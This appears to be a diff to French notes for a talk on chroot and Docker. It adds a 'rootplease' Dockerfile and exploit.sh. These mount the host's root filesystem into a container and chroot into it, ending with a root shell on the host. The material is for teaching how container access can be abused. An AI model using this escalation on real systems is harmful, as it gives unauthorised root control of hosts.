@@ -1,5 +1,7 @@
 # SCRIPTS D'ILLUSTRATION DES CONCEPTS DU TALK
 
+#### chroot
+
 $ ls /
 bin/ /home usr/ var/
 
@@ -12,4 +14,27 @@ $ sudo chroot /home/me/test /bin/bash
 $ ls /
 bin/ usr/ var/
 
+#### Docker root please
+
+# Dockerfile
+FROM alpine
+COPY exploit.sh /exploit.sh
+CMD ["/bin/bash", "exploit.sh"] 
+
+# exploit.sh
+# permet de lancer un shell fils avec pour répertoire racine "/hostOS" au lieu de "/"
+chroot /hostOS /bin/sh
+
+# on build notre image "rootplease"
+docker build -t rootplease .
+
+# on crée et lance le conteneur en montant le système de fichiers racine de l'hôte 
+# (le système d'exploitation sur lequel Docker est exécuté) 
+# dans le conteneur sous le point de montage "/hostOS"
+docker run -v /:/hostOS -it --rm rootplease
+
+# Vous avez maintenant un shell root sur l'OS DE L'HOST
+# (Ctrl-D pour sortir de l'instance docker / shell)
+$ whoami
+root
 
